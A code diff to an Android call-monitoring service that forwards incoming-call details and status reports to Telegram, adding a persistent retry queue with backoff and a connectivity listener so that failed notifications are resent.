@@ -60,6 +60,8 @@ public class CallMonitorService extends Service {
 
     private final Handler pingHandler = new Handler(Looper.getMainLooper());
     private Runnable pingRunnable;
+    private BroadcastReceiver connectivityReceiver;
+    private volatile boolean retryInProgress = false;
 
     // Battery & Status Monitoring
     private BatteryReceiver batteryReceiver;
@@ -89,6 +91,8 @@ public class CallMonitorService extends Service {
         DebugLogger.logState(this, "CallMonitorService", "service create");
         createNotificationChannel();
         telegramSender = new TelegramSender(this);
+        retryPendingNotifications();
+        registerConnectivityReceiver();
         
         // Log Service Start (Local log only)
         CustomExceptionHandler.log(this, "Service onCreate");
@@ -167,6 +171,7 @@ public class CallMonitorService extends Service {
             return START_STICKY;
         }
 
+        retryPendingNotifications();
         restartInProcessPeriodicLoop();
         scheduleNextReport();
         return START_STICKY;
@@ -344,11 +349,14 @@ public class CallMonitorService extends Service {
             // Wait 1000ms to gather data (SIM + Number)
             debounceHandler.postDelayed(sendNotificationRunnable, 1000);
             CustomExceptionHandler.log(this, "Debounce scheduled for ringing call");
+            retryPendingNotifications();
             
         } else if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
             // Cancel pending ringing notification if answered very quickly
-             if (sendNotificationRunnable != null) {
+            if (sendNotificationRunnable != null) {
                 debounceHandler.removeCallbacks(sendNotificationRunnable);
+                sendNotificationRunnable.run();
+                sendNotificationRunnable = null;
             }
             
             CustomExceptionHandler.log(this, "Call Offhook. Scheduling Hangup in 5s.");
@@ -362,6 +370,7 @@ public class CallMonitorService extends Service {
             }, 5000);
             
             isRinging = false;
+            retryPendingNotifications();
         } else if (state == TelephonyManager.CALL_STATE_IDLE) {
             // Only reset if the IDLE comes from the pending slot, or if it's a global IDLE (-1)
             // This prevents SIM 1 (Ghost) sending IDLE and cancelling SIM 2's valid Ringing state.
@@ -374,6 +383,7 @@ public class CallMonitorService extends Service {
                     debounceHandler.removeCallbacks(sendNotificationRunnable);
                 }
             }
+            retryPendingNotifications();
         }
     }
     
@@ -431,14 +441,97 @@ public class CallMonitorService extends Service {
 
             CustomExceptionHandler.log(this, "Call message built = " + msg.replace("\n", " | "));
 
-            telegramSender.sendMessage(msg);
-            CustomExceptionHandler.log(this, "telegramSender.sendMessage(msg) called");
+            String notificationId = "call_" + System.currentTimeMillis();
+            PendingNotificationManager.addPending(this, notificationId, msg);
+
+            new Thread(() -> {
+                boolean ok = telegramSender.sendMessageSync(msg);
+                if (ok) {
+                    PendingNotificationManager.markSent(CallMonitorService.this, notificationId);
+                } else {
+                    PendingNotificationManager.markRetry(CallMonitorService.this, notificationId);
+                }
+            }).start();
 
             CustomExceptionHandler.log(this, "Calling attemptAutoAnswer()");
             attemptAutoAnswer();
+            retryPendingNotifications();
 
         } catch (Exception e) {
             CustomExceptionHandler.log(this, "processRingingCall exception: " + e.getMessage());
+            CustomExceptionHandler.logError(this, e);
+        }
+    }
+
+    private void retryPendingNotifications() {
+        if (retryInProgress) return;
+        retryInProgress = true;
+        new Thread(() -> {
+            try {
+                if (!isNetworkConnected()) return;
+                org.json.JSONArray arr = PendingNotificationManager.getAll(this);
+                CustomExceptionHandler.log(this, "retryPendingNotifications count=" + arr.length());
+
+                for (int i = 0; i < arr.length(); i++) {
+                    org.json.JSONObject obj = arr.optJSONObject(i);
+                    if (obj == null) continue;
+
+                    String id = obj.optString("id", "");
+                    String text = obj.optString("text", "");
+                    int retryCount = obj.optInt("retryCount", 0);
+                    long lastTry = obj.optLong("lastTry", 0);
+
+                    long now = System.currentTimeMillis();
+                    long waitMs;
+                    if (retryCount <= 0) waitMs = 5000;
+                    else if (retryCount == 1) waitMs = 15000;
+                    else if (retryCount == 2) waitMs = 30000;
+                    else waitMs = 60000;
+
+                    if (now - lastTry < waitMs) continue;
+
+                    boolean ok = telegramSender.sendMessageSync(text);
+                    if (ok) {
+                        PendingNotificationManager.markSent(this, id);
+                    } else {
+                        PendingNotificationManager.markRetry(this, id);
+                    }
+                }
+            } catch (Exception e) {
+                CustomExceptionHandler.log(this, "retryPendingNotifications exception: " + e.getMessage());
+                CustomExceptionHandler.logError(this, e);
+            } finally {
+                retryInProgress = false;
+            }
+        }).start();
+    }
+
+    private boolean isNetworkConnected() {
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return false;
+            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+            return activeNetwork != null && activeNetwork.isConnected();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void registerConnectivityReceiver() {
+        if (connectivityReceiver != null) return;
+        try {
+            connectivityReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(Context context, Intent intent) {
+                    if (isNetworkConnected()) {
+                        retryPendingNotifications();
+                    }
+                }
+            };
+            IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
+            registerReceiver(connectivityReceiver, filter);
+        } catch (Exception e) {
+            CustomExceptionHandler.log(this, "registerConnectivityReceiver error: " + e.getMessage());
             CustomExceptionHandler.logError(this, e);
         }
     }
@@ -504,6 +597,7 @@ public class CallMonitorService extends Service {
                     CustomExceptionHandler.log(CallMonitorService.this, "Ping server");
                     telegramSender.sendPing();
                     wakeDeviceFor20Seconds();
+                    retryPendingNotifications();
                 } catch (Exception e) {
                     CustomExceptionHandler.log(CallMonitorService.this, "Ping error: " + e.getMessage());
                 }
@@ -754,6 +848,7 @@ public class CallMonitorService extends Service {
         msg.append("⏰ Time: ").append(time);
         
         telegramSender.sendStatusMessage(msg.toString());
+        retryPendingNotifications();
     }
 
     private void sendPeriodicStatusReport() {
@@ -767,6 +862,7 @@ public class CallMonitorService extends Service {
         msg.append("⏰ Time: ").append(time);
         
         telegramSender.sendStatusMessage(msg.toString());
+        retryPendingNotifications();
     }
 
     private String getBatteryInfoString() {
@@ -874,6 +970,13 @@ public class CallMonitorService extends Service {
         stopPeriodicReporting();
         if (pingRunnable != null) {
             pingHandler.removeCallbacks(pingRunnable);
+        }
+        if (connectivityReceiver != null) {
+            try {
+                unregisterReceiver(connectivityReceiver);
+            } catch (Exception ignored) {
+            }
+            connectivityReceiver = null;
         }
 
         // Removed callReceiver unregister
